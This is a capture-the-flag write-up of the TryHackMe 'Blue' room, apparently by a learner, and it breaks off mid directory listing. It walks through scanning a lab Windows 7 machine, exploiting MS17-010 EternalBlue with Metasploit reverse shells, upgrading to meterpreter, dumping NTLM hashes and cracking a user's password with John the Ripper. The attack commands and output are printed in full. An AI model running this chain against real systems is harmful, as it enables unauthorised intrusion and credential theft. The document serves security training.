# Blue

Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

**Note:** Because I was connecting through OpenVPN,
I had to pass an additional setting `set LHOST tun0` to `msfconsole`,
and I also had to allow the target machine's IP in my firewall (for reverse shell).
Otherwise, the exploit will not succeed and give you shell access.

## Task 1: Recon

Press the Start Machine button below.

Start the AttackBox by pressing the Start AttackBox button at the top of this page.
The AttackBox machine will start in Split-Screen view.
If it is not visible, use the blue Show Split View button at the top of the page.

Scan and learn what exploit this machine is vulnerable to.
Please note that this machine does not respond to ping (ICMP)
and may take a few minutes to boot up.
This room is not meant to be a boot2root CTF, rather,
this is an educational series for complete beginners.
Professionals will likely get very little out of this room beyond
basic practice as the process here is meant to be beginner-focused.

![blue-logo](blue-logo.png)

Art by one of our members, Varg -
[THM Profile](https://tryhackme.com/p/Varg) -
[Instagram](https://www.instagram.com/varghalladesign/) -
[Blue Merch](https://www.redbubble.com/shop/ap/53637482) -
[Twitter](https://twitter.com/Vargnaar)

[Link to Ice, the sequel to Blue](https://tryhackme.com/room/ice)

You can check out the third box in this series,
[Blaster, here](https://tryhackme.com/room/blaster)

The virtual machine used in this room (Blue) can be downloaded for offline usage from
<https://darkstar7471.com/resources.html>

Enjoy the room! For future rooms and write-ups, follow
[@darkstar7471](https://twitter.com/darkstar7471) on Twitter.

***Answer the questions below***

Scan the machine. (If you are unsure how to tackle this, I recommend checking out
the [Nmap room](https://tryhackme.com/room/furthernmap))

*Solution:* Use: `nmap -sV -vv --script vuln TARGET_IP`

```bash
❯ export ip=10.82.154.8
❯ nmap -sV -vv --script vuln $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-24 10:46 +03
NSE: Loaded 150 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 10:46
NSE Timing: About 66.67% done; ETC: 10:47 (0:00:15 remaining)
Completed NSE at 10:47, 34.04s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 10:47
Completed NSE at 10:47, 0.00s elapsed
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Initiating Ping Scan at 10:47
Scanning 10.82.144.110 [2 ports]
Completed Ping Scan at 10:47, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:47
Completed Parallel DNS resolution of 1 host. at 10:47, 0.00s elapsed
Initiating Connect Scan at 10:47
Scanning 10.82.144.110 (10.82.144.110) [1000 ports]
Discovered open port 3389/tcp on 10.82.144.110
Discovered open port 139/tcp on 10.82.144.110
Discovered open port 445/tcp on 10.82.144.110
Discovered open port 135/tcp on 10.82.144.110
Discovered open port 49152/tcp on 10.82.144.110
Discovered open port 49160/tcp on 10.82.144.110
Discovered open port 49153/tcp on 10.82.144.110
Discovered open port 49158/tcp on 10.82.144.110
Discovered open port 49154/tcp on 10.82.144.110
Completed Connect Scan at 10:47, 2.86s elapsed (1000 total ports)
Initiating Service scan at 10:47
Scanning 9 services on 10.82.144.110 (10.82.144.110)
Service scan Timing: About 55.56% done; ETC: 10:49 (0:00:43 remaining)
Completed Service scan at 10:48, 59.91s elapsed (9 services on 1 host)
NSE: Script scanning 10.82.144.110.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 10:48
NSE: [firewall-bypass 10.82.144.110] lacks privileges.
NSE Timing: About 99.91% done; ETC: 10:49 (0:00:00 remaining)
Completed NSE at 10:49, 60.52s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 10:49
NSE: [tls-ticketbleed 10.82.144.110:135] Not running due to lack of privileges.
NSE: [ssl-ccs-injection 10.82.144.110:3389] No response from server: ERROR
Completed NSE at 10:49, 2.82s elapsed
Nmap scan report for 10.82.144.110 (10.82.144.110)
Host is up, received conn-refused (0.079s latency).
Scanned at 2025-11-24 10:47:30 +03 for 126s
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            REASON  VERSION
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
49160/tcp open  msrpc              syn-ack Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 10:49
Completed NSE at 10:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 10:49
Completed NSE at 10:49, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 160.56 seconds
```

***Correct answer: No answer needed***

How many ports are open with a port number under 1000?

***Correct answer: 3***

What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

***Correct answer: ms17-010***

exploit/windows/smb/ms17_010_eternalblue
RHOSTS

## Task 2: Gain access

Exploit the machine and gain a foothold.

***Answer the questions below***

Start [Metasploit](https://tryhackme.com/module/metasploit)

*Solution:* Run the command `msfconsole`

```bash
❯ msfconsole
Running the 'init' command for the database:
Existing database found, attempting to start it
Starting database at /home/spam/.msf4/db...pg_ctl: another server might be running; trying to start server anyway
waiting for server to start.... done
server started
success
Metasploit tip: Keep track of findings and observations with notes

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

       =[ metasploit v6.4.99-dev-                               ]
+ -- --=[ 2,572 exploits - 1,317 auxiliary - 1,680 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf >
```

***Correct answer: No answer needed***

Find the exploitation code we will run against the machine.
What is the full path of the code? (Ex: exploit/........)

*Solution:* Run `search ms17-010` in the MSF console.

```bash
msf > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .

Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
```

***Correct answer: exploit/windows/smb/ms17_010_eternalblue***

Show options and set the one required value.
What is the name of this value? (All caps for submission)

*Solution:* First use the exploit to change the shell prompt, then view options.

```bash
msf > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > show options
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.c
                                             om/docs/using-metasploit/basics/using-metasploit.
                                             html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authenti
                                             cation. Only affects Windows Server 2008 R2, Wind
                                             ows 7, Windows Embedded Standard 7 target machine
                                             s.
   SMBPass                         no        (Optional) The password for the specified usernam
                                             e
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Targ
                                             et. Only affects Windows Server 2008 R2, Windows
                                             7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only a
                                             ffects Windows Server 2008 R2, Windows 7, Windows
                                              Embedded Standard 7 target machines.

Payload options (windows/x64/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, no
                                        ne)
   LHOST     192.168.1.100    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:
   Id  Name
   --  ----
   0   Automatic Target

View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.82.154.8
RHOSTS => 10.82.154.8
```

***Correct answer: RHOSTS***

Usually it would be fine to run this exploit as is;
however, for the sake of learning, you should do one more thing
before exploiting the target. Enter the following command and press enter:

```bash
set payload windows/x64/shell/reverse_tcp
```

With that done, run the exploit!

*Solution:* First, I also had to set the `LHOST` variable to `tun0` (using OpenVPN).

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
LHOST => tun0
msf exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 192.168.139.31:4444
[*] 10.82.154.8:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.82.154.8:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.82.154.8:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.82.154.8:445 - The target is vulnerable.
[*] 10.82.154.8:445 - Connecting to target for exploitation.
[+] 10.82.154.8:445 - Connection established for exploitation.
[+] 10.82.154.8:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.82.154.8:445 - CORE raw buffer dump (42 bytes)
[*] 10.82.154.8:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.82.154.8:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.82.154.8:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.82.154.8:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.82.154.8:445 - Trying exploit with 12 Groom Allocations.
[*] 10.82.154.8:445 - Sending all but last fragment of exploit packet
[*] 10.82.154.8:445 - Starting non-paged pool grooming
[+] 10.82.154.8:445 - Sending SMBv2 buffers
[+] 10.82.154.8:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.82.154.8:445 - Sending final SMBv2 buffers.
[*] 10.82.154.8:445 - Sending last fragment of exploit packet!
[*] 10.82.154.8:445 - Receiving response from exploit packet
[+] 10.82.154.8:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.82.154.8:445 - Sending egg to corrupted connection.
[*] 10.82.154.8:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.80.175.105
[*] Command shell session 1 opened (192.168.130.211:4444 -> 10.80.175.105:49182) at 2025-11-24 21:31:56 +0300
[+] 10.80.175.105:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.80.175.105:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.80.175.105:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----

C:\Windows\system32>
```

***Correct answer: No answer needed***

Confirm that the exploit has run correctly.
You may have to press enter for the DOS shell to appear.
Background this shell (CTRL + Z).
If this failed, you may have to reboot the target VM.
Try running it again before a reboot of the target.

***Correct answer: No answer needed***

## Task 3: Escalate

***Answer the questions below***

If you haven't already, background the previously gained shell (CTRL + Z).
Research online how to convert a shell to meterpreter shell in metasploit.
What is the name of the post module we will use?
(Exact path, similar to the exploit we previously selected)

*Solution:*

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter  .                normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

msf exploit(windows/smb/ms17_010_eternalblue) >
```

***Correct answer: post/multi/manage/shell_to_meterpreter***

Select this (use MODULE_PATH). Show options, what option are we required to change?

*Solution:*

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > use multi/manage/shell_to_meterpreter
msf post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connectio
                                       n
   LHOST                     no        IP of host that will receive the connection from the pa
                                       yload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on

View the full module info with the info, or info -d command.

msf post(multi/manage/shell_to_meterpreter) >
```

***Correct answer: session***

Set the required option, you may need to list all of
the sessions to find your target here.

*Solution:*

```bash
msf post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf post(multi/manage/shell_to_meterpreter) >
```

***Correct answer: No answer needed***

Run! If this doesn't work, try completing the exploit from the previous task once more.

*Solution:*

```bash
msf post(multi/manage/shell_to_meterpreter) > run
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.130.211:4433
[*] Post module execution completed
[*] Sending stage (230982 bytes) to 10.80.175.105
[*] Meterpreter session 2 opened (192.168.130.211:4433 -> 10.80.175.105:49186) at 2025-11-24 21:52:35 +0300
[*] Stopping exploit/multi/handler
msf post(multi/manage/shell_to_meterpreter) >
```

***Correct answer: No answer needed***

Once the meterpreter shell conversion completes, select that session for use.

*Solution:* Session 2 opened up. Check with `sessions -l`

```bash
msf post(multi/manage/shell_to_meterpreter) > sessions -l
Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  1         shell x64/windows        Shell Banner: Microsoft Win  192.168.130.211:4444 -> 10.8
                                     dows [Version 6.1.7601] ---  0.175.105:49182 (10.80.175.1
                                     --                           05)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-P  192.168.130.211:4433 -> 10.8
                                     C                            0.175.105:49186 (10.80.175.105)
```

The 2nd session is escalated. Select that one with `sessions -i 2`:

```bash
msf post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```

***Correct answer: No answer needed***

Verify that we have escalated to NT AUTHORITY\SYSTEM.
Run `getsystem` to confirm this.
Feel free to open a dos shell via the command 'shell' and run 'whoami'.
This should return that we are indeed system.
Background this shell afterwards and select our meterpreter session for usage again.

*Solution:*

```bash
meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > shell
Process 1248 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>^Z
Background channel 1? [y/N]  y
meterpreter >
```

***Correct answer: No answer needed***

List all of the processes running via the 'ps' command.
Just because we are system doesn't mean our process is.
Find a process towards the bottom of this list that is running
at NT AUTHORITY\SYSTEM and write down the process id (far left column).

*Solution:*

```bash
meterpreter > ps

Process List
============

 PID   PPID  Name            Arch  Session  User                      Path
 ---   ----  ----            ----  -------  ----                      ----
 0     0     [System Proces
             s]
 4     0     System          x64   0
 100   700   svchost.exe     x64   0        NT AUTHORITY\SYSTEM
 416   4     smss.exe        x64   0        NT AUTHORITY\SYSTEM       \SystemRoot\System32\sms
                                                                      s.exe
 472   700   svchost.exe     x64   0        NT AUTHORITY\SYSTEM
 552   544   csrss.exe       x64   0        NT AUTHORITY\SYSTEM       C:\Windows\system32\csrs
                                                                      s.exe
 600   544   wininit.exe     x64   0        NT AUTHORITY\SYSTEM       C:\Windows\system32\wini
                                                                      nit.exe
 612   592   csrss.exe       x64   1        NT AUTHORITY\SYSTEM       C:\Windows\system32\csrs
                                                                      s.exe
 616   1272  cmd.exe         x64   0        NT AUTHORITY\SYSTEM       C:\Windows\System32\cmd.
                                                                      exe
 652   592   winlogon.exe    x64   1        NT AUTHORITY\SYSTEM       C:\Windows\system32\winl
                                                                      ogon.exe
 700   600   services.exe    x64   0        NT AUTHORITY\SYSTEM       C:\Windows\system32\serv
                                                                      ices.exe
 708   600   lsass.exe       x64   0        NT AUTHORITY\SYSTEM       C:\Windows\system32\lsas
                                                                      s.exe
 716   600   lsm.exe         x64   0        NT AUTHORITY\SYSTEM       C:\Windows\system32\lsm.
                                                                      exe
 824   700   svchost.exe     x64   0        NT AUTHORITY\SYSTEM
 892   700   svchost.exe     x64   0        NT AUTHORITY\NETWORK SER
                                            VICE
 940   700   svchost.exe     x64   0        NT AUTHORITY\LOCAL SERVI
                                            CE
 1012  652   LogonUI.exe     x64   1        NT AUTHORITY\SYSTEM       C:\Windows\system32\Logo
                                                                      nUI.exe
 1060  700   svchost.exe     x64   0        NT AUTHORITY\LOCAL SERVI
                                            CE
 1144  700   svchost.exe     x64   0        NT AUTHORITY\NETWORK SER
                                            VICE
 1248  2996  cmd.exe         x64   0        NT AUTHORITY\SYSTEM       C:\Windows\system32\cmd.
                                                                      exe
 1272  700   spoolsv.exe     x64   0        NT AUTHORITY\SYSTEM       C:\Windows\System32\spoo
                                                                      lsv.exe
 1328  700   svchost.exe     x64   0        NT AUTHORITY\LOCAL SERVI
                                            CE
 1388  824   WmiPrvSE.exe    x64   0        NT AUTHORITY\SYSTEM       C:\Windows\system32\wbem
                                                                      \wmiprvse.exe
 1392  700   amazon-ssm-age  x64   0        NT AUTHORITY\SYSTEM       C:\Program Files\Amazon\
             nt.exe                                                   SSM\amazon-ssm-agent.exe
 1464  700   LiteAgent.exe   x64   0        NT AUTHORITY\SYSTEM       C:\Program Files\Amazon\
                                                                      XenTools\LiteAgent.exe
 1596  700   Ec2Config.exe   x64   0        NT AUTHORITY\SYSTEM       C:\Program Files\Amazon\
                                                                      Ec2ConfigService\Ec2Conf
                                                                      ig.exe
 1636  552   conhost.exe     x64   0        NT AUTHORITY\SYSTEM       C:\Windows\system32\conh
                                                                      ost.exe
 1708  824   WmiPrvSE.exe
 1924  700   TrustedInstall  x64   0        NT AUTHORITY\SYSTEM
             er.exe
 1936  700   svchost.exe     x64   0        NT AUTHORITY\NETWORK SER
                                            VICE
 2136  552   conhost.exe     x64   0        NT AUTHORITY\SYSTEM       C:\Windows\system32\conh
                                                                      ost.exe
 2356  700   svchost.exe     x64   0        NT AUTHORITY\LOCAL SERVI
                                            CE
 2420  700   sppsvc.exe      x64   0        NT AUTHORITY\NETWORK SER
                                            VICE
 2548  700   vds.exe         x64   0        NT AUTHORITY\SYSTEM
 2592  552   conhost.exe     x64   0        NT AUTHORITY\SYSTEM       C:\Windows\system32\conh
                                                                      ost.exe
 2648  700   svchost.exe     x64   0        NT AUTHORITY\SYSTEM
 2700  700   SearchIndexer.  x64   0        NT AUTHORITY\SYSTEM
             exe
 2996  1724  powershell.exe  x64   0        NT AUTHORITY\SYSTEM       C:\Windows\System32\Wind
                                                                      owsPowerShell\v1.0\power
                                                                      shell.exe
 3024  1596  powershell.exe  x64   0        NT AUTHORITY\SYSTEM       C:\Windows\system32\Wind
                                                                      owsPowerShell\v1.0\power
                                                                      shell.exe
 3032  552   conhost.exe     x64   0        NT AUTHORITY\SYSTEM       C:\Windows\system32\conh
                                                                      ost.exe
```

***Correct answer: No answer needed***

Migrate to this process using the 'migrate PROCESS_ID' command
where the process id is the one you just wrote down in the previous step.
This may take several attempts, migrating processes is not very stable.
If this fails, you may need to re-run the conversion process or reboot the machine
and start once again. If this happens, try a different process next time.

*Solution:* I had to keep choosing different processes until it worked.

```bash
meterpreter > migrate 2548
[*] Migrating from 2996 to 2548...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > migrate 3032
[*] Migrating from 2996 to 3032...
[*] Migration completed successfully.
meterpreter >
```

***Correct answer: No answer needed***

## Task 4: Cracking

Dump the non-default user's password and crack it!

***Answer the questions below***

Within our elevated meterpreter shell, run the command 'hashdump'.
This will dump all of the passwords on the machine as long as we have
the correct privileges to do so. What is the name of the non-default user?

*Solution:*

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter >
```

`hashdump` output follows the following format:

- Username (Administrator, User1, etc.)
- Relative Identification (RID)
- LM hash
- NTLM hash

The non-default user is Jon.

***Correct answer: Jon***

Copy this password hash to a file and research how to crack it.
What is the cracked password?

*Solution:* Do this on another Terminal window or tab:

```bash
❯ echo 'Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::' > hash.txt
❯ bat hash.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────
       │ File: hash.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────
   1   │ Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
───────┴────────────────────────────────────────────────────────────────────────────────────────
❯
```

We can use John the Ripper to crack the hash.
You can install it on Ubuntu with: `apt install john`.
But this version does not seem to have the required format support.
So you have to install the "jumbo" version with additions / extensions from its Github:
[John The Ripper Jumbo version](https://github.com/openwall/john)

Then:

```bash
> john --format=nt --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

***Correct answer: alqfna22***

## Task 5

```bash
meterpreter > pwd
C:\Windows\system32
meterpreter > cd ..
meterpreter > cd ..
meterpreter > pwd
C:\
meterpreter > dir
Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2018-12-13 06:13:36 +0300  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-14 08:08:56 +0300  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-14 06:20:08 +0300  PerfLogs
040555/r-xr-xr-x  4096   dir   2019-03-18 01:22:01 +0300  Program Files
040555/r-xr-xr-x  4096   dir   2019-03-18 01:28:38 +0300  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2019-03-18 01:35:57 +0300  ProgramData
040777/rwxrwxrwx  0      dir   2018-12-13 06:13:22 +0300  Recovery
040777/rwxrwxrwx  4096   dir   2025-11-24 22:01:36 +0300  System Volume Information
040555/r-xr-xr-x  4096   dir   2018-12-13 06:13:28 +0300  Users
040777/rwxrwxrwx  16384  dir   2019-03-18 01:36:30 +0300  Windows
040777/rwxrwxrwx  0      dir   2025-11-24 21:25:34 +0300  badr
100666/rw-rw-rw-  24     fil   2019-03-17 22:27:21 +0300  flag1.txt
000000/---------  0      fif   1970-01-01 02:00:00 +0200  hiberfil.sys
000000/---------  0      fif   1970-01-01 02:00:00 +0200  pagefile.sys

meterpreter > cat flag1.txt
flag{access_the_machine}
meterpreter >
```

```bash
meterpreter > cd C:/Windows/System32/config
meterpreter > dir
Listing: C:\Windows\System32\config
===================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  28672     fil   2018-12-13 02:00:40 +0300  BCD-Template
100666/rw-rw-rw-  25600     fil   2018-12-13 02:00:40 +0300  BCD-Template.LOG
100666/rw-rw-rw-  18087936  fil   2025-11-24 21:35:55 +0300  COMPONENTS
100666/rw-rw-rw-  1024      fil   2011-04-12 11:32:10 +0300  COMPONENTS.LOG
100666/rw-rw-rw-  13312     fil   2025-11-24 21:35:55 +0300  COMPONENTS.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 05:34:08 +0300  COMPONENTS.LOG2
100666/rw-rw-rw-  1048576   fil   2025-11-24 21:25:35 +0300  COMPONENTS{016888b8-6c6f-11de-8d1
                                                             d-001e0bcde3ec}.TxR.0.regtrans-ms
100666/rw-rw-rw-  1048576   fil   2025-11-24 21:25:35 +0300  COMPONENTS{016888b8-6c6f-11de-8d1
                                                             d-001e0bcde3ec}.TxR.1.regtrans-ms
100666/rw-rw-rw-  1048576   fil   2025-11-24 21:25:35 +0300  COMPONENTS{016888b8-6c6f-11de-8d1
                                                             d-001e0bcde3ec}.TxR.2.regtrans-ms
100666/rw-rw-rw-  65536     fil   2025-11-24 21:25:35 +0300  COMPONENTS{016888b8-6c6f-11de-8d1
                                                             d-001e0bcde3ec}.TxR.blf
100666/rw-rw-rw-  65536     fil   2018-12-13 06:20:57 +0300  COMPONENTS{016888b9-6c6f-11de-8d1
                                                             d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2018-12-13 06:20:57 +0300  COMPONENTS{016888b9-6c6f-11de-8d1
